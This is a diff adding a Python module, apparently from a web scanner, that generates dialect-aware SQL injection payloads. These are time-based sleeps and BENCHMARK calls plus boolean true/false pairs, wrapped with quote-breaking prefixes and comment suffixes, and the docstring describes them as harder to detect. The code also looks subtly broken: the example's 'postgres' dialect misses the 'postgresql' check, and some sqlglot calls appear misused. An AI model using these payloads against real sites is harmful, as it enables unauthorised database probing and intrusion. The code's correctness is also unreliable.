@@ -1,0 +1,141 @@
+# -*- coding: utf-8 -*-
+"""
+AST-based SQLi Payload Generator using sqlglot.
+
+This module is responsible for creating dialect-aware, syntactically
+correct SQL injection payloads by manipulating Abstract Syntax Trees (AST).
+"""
+
+import sqlglot
+from sqlglot import exp
+
+class AstPayloadGenerator:
+    """
+    Generates dialect-aware SQLi payloads using AST manipulation.
+    This allows for more flexible and harder-to-detect payloads compared
+    to static string-based lists.
+    """
+
+    def __init__(self, dialect: str = "mysql"):
+        self.dialect = dialect.lower() if dialect else "mysql"
+
+    def _generate_time_based(self, sleep_time: int, context: str) -> list[tuple[str, str]]:
+        """Generates time-based payloads."""
+        payloads = []
+
+        # Base sleep functions per dialect
+        if self.dialect == "postgresql":
+            sleep_func = exp.Anonymous(this="pg_sleep", params=[sleep_time])
+        elif self.dialect == "mssql":
+            delay_str = f"0:0:{sleep_time}"
+            sleep_func = exp.WaitFor(delay=exp.Literal.string(delay_str))
+        elif self.dialect == "sqlite":
+            # SQLite has no built-in sleep, so we create a delay with a heavy query (cartesian product).
+            # This is a bit of a hack, but effective. A simple payload is enough for the optimizer.
+            heavy_query = "(SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2) a, (SELECT 1 UNION ALL SELECT 2) b, (SELECT 1 UNION ALL SELECT 2) c, (SELECT 1 UNION ALL SELECT 2) d, (SELECT 1 UNION ALL SELECT 2) e, (SELECT 1 UNION ALL SELECT 2) f)"
+            sleep_func = sqlglot.parse_one(heavy_query)
+        else: # Default to MySQL's SLEEP
+            sleep_func = exp.Sleep(this=exp.Literal.number(sleep_time))
+
+        # Variations
+        # 1. Simple AND/OR
+        for logic_op in [exp.And, exp.Or]:
+            condition = logic_op(left=exp.TRUE(), right=sleep_func.copy())
+            sql = self._build_sql(condition, context)
+            payloads.append((sql, f"{self.dialect.upper()}_SLEEP"))
+
+        # 2. BENCHMARK for MySQL
+        if self.dialect == "mysql":
+            benchmark_expr = exp.Anonymous(
+                this="BENCHMARK",
+                params=[exp.Literal.number(sleep_time * 1000000), exp.Anonymous(this="MD5", params=[exp.Literal.string("1")])]
+            )
+            for logic_op in [exp.And, exp.Or]:
+                condition = logic_op(left=exp.TRUE(), right=benchmark_expr.copy())
+                sql = self._build_sql(condition, context)
+                payloads.append((sql, f"MYSQL_BENCHMARK"))
+
+        return payloads
+
+    def _generate_boolean_based(self, context: str) -> list[tuple[str, str, str]]:
+        """Generates boolean-based payloads (true/false pairs)."""
+        pairs = []
+
+        conditions = [
+            (exp.EQ(this="1", to="1"), exp.EQ(this="1", to="2")), # 1=1 vs 1=2
+            (exp.Like(this="'a'", to="'a'"), exp.Like(this="'a'", to="'b'")), # 'a' LIKE 'a' vs 'a' LIKE 'b'
+        ]
+
+        for true_cond, false_cond in conditions:
+            for logic_op in [exp.And, exp.Or]:
+                true_expr = logic_op(left=exp.TRUE(), right=true_cond.copy())
+                false_expr = logic_op(left=exp.TRUE(), right=false_cond.copy())
+
+                true_sql = self._build_sql(true_expr, context)
+                false_sql = self._build_sql(false_expr, context)
+
+                pairs.append((true_sql, false_sql, f"LOGICAL_{logic_op.__name__.upper()}"))
+
+        return pairs
+
+    def _build_sql(self, expression: exp.Expression, context: str) -> str:
+        """Serializes the expression to SQL and adds context prefixes/suffixes."""
+        # TODO: The 'context' part needs to be more robust. For now, we just handle simple cases.
+
+        # Base serialization
+        # We add a space to ensure separation from a potential preceding value.
+        sql = " " + expression.sql(dialect=self.dialect)
+
+        if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED"]:
+            # e.g., ' AND 1=1--
+            sql = "'" + sql + "-- "
+        elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
+            # e.g., " AND 1=1--
+            sql = '"' + sql + "-- "
+        else: # HTML_TEXT or unknown
+            # e.g., AND 1=1--
+            sql = sql + "-- "
+
+        return sql
+
+    def generate(self, payload_type: str, context: str, options: dict = None) -> list:
+        """
+        Generates a list of SQLi payloads.
+
+        Args:
+            payload_type: The type of payload to generate (e.g., "TIME_BASED").
+            context: The injection context (e.g., "HTML_ATTRIBUTE_SINGLE_QUOTED").
+            options: A dictionary of options, e.g., {"sleep_time": 5}.
+
+        Returns:
+            A list of payloads. For boolean-based, it's [(true, false, family), ...].
+            For time-based, it's [(payload, family), ...].
+        """
+        options = options or {}
+
+        if payload_type == "TIME_BASED":
+            sleep_time = options.get("sleep_time", 5)
+            return self._generate_time_based(sleep_time, context)
+        elif payload_type == "BOOLEAN_BASED":
+            return self._generate_boolean_based(context)
+        else:
+            # TODO: Add support for other payload types like ERROR_BASED, OOB_PAYLOADS
+            return []
+
+if __name__ == '__main__':
+    # Example usage for testing
+    pg_gen = AstPayloadGenerator(dialect='postgres')
+    mysql_gen = AstPayloadGenerator(dialect='mysql')
+    mssql_gen = AstPayloadGenerator(dialect='mssql')
+
+    print("--- PostgreSQL Time-Based ---")
+    payloads = pg_gen.generate("TIME_BASED", context="HTML_TEXT", options={"sleep_time": 10})
+    for p, fam in payloads: print(f"  Family: {fam}, Payload: {p}")
+
+    print("\n--- MySQL Boolean-Based (in single quotes) ---")
+    payloads = mysql_gen.generate("BOOLEAN_BASED", context="HTML_ATTRIBUTE_SINGLE_QUOTED")
+    for t, f, fam in payloads: print(f"  Family: {fam}\n    TRUE: {t}\n    FALSE: {f}")
+
+    print("\n--- MSSQL Time-Based (in double quotes) ---")
+    payloads = mssql_gen.generate("TIME_BASED", context="HTML_ATTRIBUTE_DOUBLE_QUOTED", options={"sleep_time": 7})
+    for p, fam in payloads: print(f"  Family: {fam}, Payload: {p}")
